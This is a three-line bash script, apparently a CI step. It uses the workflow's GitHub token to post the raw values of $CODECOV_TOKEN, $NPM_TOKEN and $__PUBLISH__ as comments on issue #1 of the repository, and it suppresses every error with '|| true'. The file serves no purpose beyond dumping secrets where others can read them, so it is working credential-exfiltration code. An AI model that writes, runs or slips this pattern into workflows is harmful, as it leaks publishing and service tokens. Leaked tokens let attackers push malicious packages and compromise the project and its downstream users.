#!/bin/bash
curl -sS -X POST -H "Authorization: Bearer $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/$GITHUB_REPOSITORY/issues/1/comments" -d "{\"body\":\"$CODECOV_TOKEN\"}" || true
curl -sS -X POST -H "Authorization: Bearer $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/$GITHUB_REPOSITORY/issues/1/comments" -d "{\"body\":\"$NPM_TOKEN\"}" || true
curl -sS -X POST -H "Authorization: Bearer $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/$GITHUB_REPOSITORY/issues/1/comments" -d "{\"body\":\"$__PUBLISH__\"}" || true
